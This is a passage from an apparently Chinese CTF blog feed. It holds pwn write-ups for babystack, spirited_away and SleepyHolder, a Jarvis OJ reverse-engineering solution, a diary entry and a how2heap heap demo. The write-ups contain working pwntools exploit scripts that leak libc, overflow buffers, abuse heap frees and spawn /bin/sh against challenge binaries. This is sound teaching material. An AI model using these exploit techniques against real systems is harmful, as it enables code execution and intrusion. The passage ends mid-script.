class="line">0xef6c4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./babystack&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_64.so.6&apos;)</span><br><span class="line">bin = ELF(&apos;./babystack&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_offset = 0x45216</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def copy():</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Copy :&apos;)</span><br><span class="line">    sh.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(pwd,lo=1):</span><br><span class="line">    if lo:</span><br><span class="line">        sh.send(&apos;1&apos;+&apos;a&apos;*15)</span><br><span class="line">    else:</span><br><span class="line">        sh.send(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Your passowrd :&apos;)</span><br><span class="line">    sh.send(pwd)</span><br><span class="line">    return sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(length,secret=&apos;&apos;):</span><br><span class="line">    for i in range(length):</span><br><span class="line">        for q in range(1,256):</span><br><span class="line">            if &apos;Success&apos; in login(secret+chr(q)+&apos;\n&apos;,False):</span><br><span class="line">                secret+=chr(q)</span><br><span class="line">                sh.sendline(&apos;1&apos;)</span><br><span class="line">                sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">                break</span><br><span class="line">    return secret</span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"># 爆破随机数</span><br><span class="line">secret = guess(16)</span><br><span class="line"></span><br><span class="line"># 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址</span><br><span class="line">login(&apos;\x00&apos;+&apos;a&apos;*0x57)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"># strcpy溢出泄露buf位置的libc</span><br><span class="line">base = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\x00\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;]        //泄漏的位置有点诡异。。。</span><br><span class="line"></span><br><span class="line">one_gadget_addr = one_gadget_offset + base</span><br><span class="line"></span><br><span class="line">## 覆盖返回地址到one_gadget_addr 得到shell</span><br><span class="line">pay = &apos;\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">login(pay)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="spirited-away"><a href="#spirited-away" class="headerlink" title="spirited_away"></a>spirited_away</h1><p><em>比较简短的一个程序，不过好久没看题了。。考试实习忙的一批</em></p><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int survey()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+10h] [ebp-E8h]</span><br><span class="line">  size_t nbytes; // [esp+48h] [ebp-B0h]</span><br><span class="line">  size_t v3; // [esp+4Ch] [ebp-ACh]</span><br><span class="line">  char s; // [esp+50h] [ebp-A8h]</span><br><span class="line">  int age; // [esp+A0h] [ebp-58h]</span><br><span class="line">  void *name; // [esp+A4h] [ebp-54h]</span><br><span class="line">  int reason; // [esp+A8h] [ebp-50h]</span><br><span class="line"></span><br><span class="line">  nbytes = 0x3C;</span><br><span class="line">  v3 = 0x50;</span><br><span class="line">LABEL_2:</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  name = malloc(0x3Cu);</span><br><span class="line">  printf(&quot;\nPlease enter your name: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, name, nbytes);</span><br><span class="line">  printf(&quot;Please enter your age: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;age);</span><br><span class="line">  printf(&quot;Why did you came to see this movie? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;reason, v3);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  printf(&quot;Please enter your comment: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Name: %s\n&quot;, name);</span><br><span class="line">  printf(&quot;Age: %d\n&quot;, age);</span><br><span class="line">  printf(&quot;Reason: %s\n&quot;, &amp;reason);          //leak</span><br><span class="line">  printf(&quot;Comment: %s\n\n&quot;, &amp;s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  fflush(stdout);</span><br><span class="line">  sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">  puts(&amp;v1);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  if ( cnt &gt; 199 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;200 comments is enough!&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    read(0, &amp;choice, 3u);</span><br><span class="line">    if ( choice == &apos;Y&apos; || choice == &apos;y&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      free(name);                             </span><br><span class="line">      goto LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice == &apos;N&apos; || choice == &apos;n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Wrong choice.&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h2><p>题目疯狂使用fflush(stdout),容易让人产生怀疑。。<br>前面均使用read读入，不会在结尾加任何东西，但是在输出时使用printf会泄露栈上的内容，也就有希望得到libc基地址和栈地址；<br>第二个漏洞比较隐蔽，看了v神的思路，自己调试了半天，才终于看出这个漏洞.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br></pre></td></tr></table></figure><p>这一句看上去是没什么问题，但是在输出时，1,10,100占的位数并不相同，因为应该是把cnt以字符串形式来输出的，这样达到100次及以上之后，最后一个字母n溢出到了nbytes的位置，把原来的0x3c变成了0x6e,而这个nbytes是控制后面输入的comment的长度的，comment可以溢出到name指针的位置就能控制这个指针任意地址free，可以将其修改至栈上，之后分配name时就可以将其分配到栈上写入system(‘/bin/sh’)，rop得到shell。</p><h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><p><em>鉴于gdb还是不能与pwntools一起调试，各个地址不能得到准确值，所以之后搞好了再写完整的exp</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./spirited_away&apos;)</span><br><span class="line">bin = ELF(&apos;./spirited_away&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def comment(name,age,reason,comments):</span><br><span class="line">    sh.recvuntil(&quot;name: &quot;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&quot;age: &quot;)</span><br><span class="line">    sh.sendline(str(age))</span><br><span class="line">    sh.recvuntil(&quot;movie? &quot;)</span><br><span class="line">    sh.sendline(reason)</span><br><span class="line">    sh.recvuntil(&quot;comment: &quot;)</span><br><span class="line">    sh.sendline(comments)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*16,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*16)</span><br><span class="line">io_file_sync9 = sh.recv(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">libc.address = u32(io_file_sync9) - libc.sym[&apos;_IO_file_sync&apos;]-9</span><br><span class="line">success(&quot;libc_addr = &quot; + hex(libc.address))</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*0x50,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x50)</span><br><span class="line">stack_addr = u32(sh.recv(4))- 0x28</span><br><span class="line">success(&quot;stack_addr = &quot; + hex(stack_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    comment(&quot;sir&quot;,19,&apos;a&apos;*0x48,&apos;b&apos;*59)</span><br><span class="line">    sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">    sh.send(&apos;y&apos;)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">rea = p32(0)+p32(0x41)+&apos;A&apos;*56+p32(0)+p32(0x41)</span><br><span class="line">pay = &apos;c&apos;*80 + &apos;bbbb&apos; + p32(stack_addr)+p32(0)+p32(0x41)</span><br><span class="line">comment(&apos;sir&apos;,19,rea, pay)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line">pay = &apos;bbbb&apos; +p32(libc.sym[&apos;system&apos;]) + &apos;bbbb&apos;+p32(libc.search(&apos;/bin/sh\x00&apos;).next())</span><br><span class="line">comment(pay, 19, &apos;a&apos;*0x20, &apos;b&apos;*2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis Oj-reverse</title>
      <link href="/2018/11/06/jarvis-oj-reverse/"/>
      <url>/2018/11/06/jarvis-oj-reverse/</url>
      <content type="html"><![CDATA[<p><em>稍微学学逆向</em></p><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p>  拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题）<br>  将pyc还原成py文件<br>  发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序）<br>  直接上wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] </span><br><span class="line">pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]</span><br><span class="line">pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line"></span><br><span class="line">flag = &quot; &quot;</span><br><span class="line">for i in range (0,17):</span><br><span class="line">    flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )</span><br><span class="line"></span><br><span class="line">f = flag[::-1]</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><ul><li>对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg</li></ul>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20181027</title>
      <link href="/2018/10/27/diary-20181027/"/>
      <url>/2018/10/27/diary-20181027/</url>
      <content type="html"><![CDATA[<p>  或许真的是极尽苦难的一周。<br>  也是一事无成的一周。<br>  少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。<br>  虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。<br>  再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。<br>  虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。<br>  所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。<br>  不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.2-fastbin_dup_consolidate</title>
      <link href="/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/"/>
      <url>/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/</url>
      <content type="html"><![CDATA[<p>比较神奇的一个利用。<br>pwntools —&gt;  cyclic   cyclic_find<br>i locals</p><h1 id="fastbin-dup-consolidate原理"><a href="#fastbin-dup-consolidate原理" class="headerlink" title="fastbin_dup_consolidate原理"></a>fastbin_dup_consolidate原理</h1><p>  当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate<br>这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。</p><p>继续使用how2heap的例子来理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260</span><br></pre></td></tr></table></figure><h1 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h1><p><em>简单程度和uaf相当hhhh</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>main</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int buf; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  alarm0x3c();                                  // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Waking Sleepy Holder up ...&quot;);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 4uLL);</span><br><span class="line">  buf &amp;= 0xFFFu;</span><br><span class="line">  malloc(buf);                                  // malloc something random to change heap_address every time</span><br><span class="line">                                                // </span><br><span class="line">  sleep(3u);</span><br><span class="line">  puts(&quot;Hey! Do you have any secret?&quot;);</span><br><span class="line">  puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1. Keep secret&quot;);</span><br><span class="line">    puts(&quot;2. Wipe secret&quot;);</span><br><span class="line">    puts(&quot;3. Renew secret&quot;);</span><br><span class="line">    memset(&amp;s, 0, 4uLL);</span><br><span class="line">    read(0, &amp;s, 4uLL);</span><br><span class="line">    v3 = atoi(&amp;s);</span><br><span class="line">    v6 = v3;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        wipe_secret();     //仅仅把free掉并把该chunk的inuse位标记为0</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        renew_secret();    //重新改写1或者2的chunk，大小最大还是原来那么大。</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        keep_serect();    //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1.</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>假设三个chunk分别为chunk0,1,2;</p><ol><li>首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1.</li><li>之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。</li><li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。</li><li>算出system的地址，并将其写入free_got，调用free便可以getshell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">p = process(&apos;./SleepyHolder&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./SleepyHolder&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)     //ldd ./SleepyHolder</span><br><span class="line"></span><br><span class="line">def add(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span 